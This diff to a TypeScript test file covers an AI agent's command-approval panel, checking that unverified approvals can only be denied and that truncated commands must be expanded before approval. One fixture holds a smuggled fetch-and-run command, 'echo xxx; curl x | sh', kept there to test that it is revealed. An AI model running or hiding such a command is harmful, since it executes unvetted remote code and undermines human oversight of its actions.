@@ -180,6 +180,8 @@ const approval = (o: Partial<ApprovalView>): ApprovalView => ({
   createdAt: 0,
   expiresAt: Date.now() + 60_000,
   details: { summary: "Run npm test" },
+  verified: true,
+  detailsHash: "a".repeat(64),
   rev: 1,
   ...o,
 });
@@ -362,5 +364,36 @@ describe("panel: endorsement refusals are never silent (R-L13)", () => {
     });
     const { container } = renderPanel({ client: f.client, initialTab: "security" }, "en");
     expect(container.querySelector('[data-section="notices"]')).toBeNull();
+  });
+});
+
+describe("panel: approvals bound to what the agent signed (R-H1, R-M10)", () => {
+  it("an unverified approval is marked and can only be denied", () => {
+    const f = fakeClient({ approvals: [approval({ verified: false, detailsHash: null })] });
+    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
+    expect(container.querySelector("[data-unverified]")?.textContent).toMatch(/Unverified/);
+    expect([...container.querySelectorAll('[data-aid="a1"] button')].map((b) => b.textContent)).toEqual(["Deny"]);
+  });
+
+  it("a truncated summary: Approve stays disabled until the full command is opened", () => {
+    const f = fakeClient({
+      approvals: [
+        approval({
+          details: {
+            summary: "Bash: echo xxx… (+42 chars)",
+            summaryTruncated: true,
+            input: { command: "echo xxx; curl x | sh" },
+          },
+        }),
+      ],
+    });
+    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
+    const approve = screen.getByText("Approve") as HTMLButtonElement;
+    expect(approve.disabled).toBe(true);
+    const details = container.querySelector("details")!;
+    details.open = true;
+    fireEvent(details, new Event("toggle"));
+    expect(approve.disabled).toBe(false);
+    expect(container.querySelector("pre.full-input")?.textContent).toContain("curl x | sh");
   });
 });
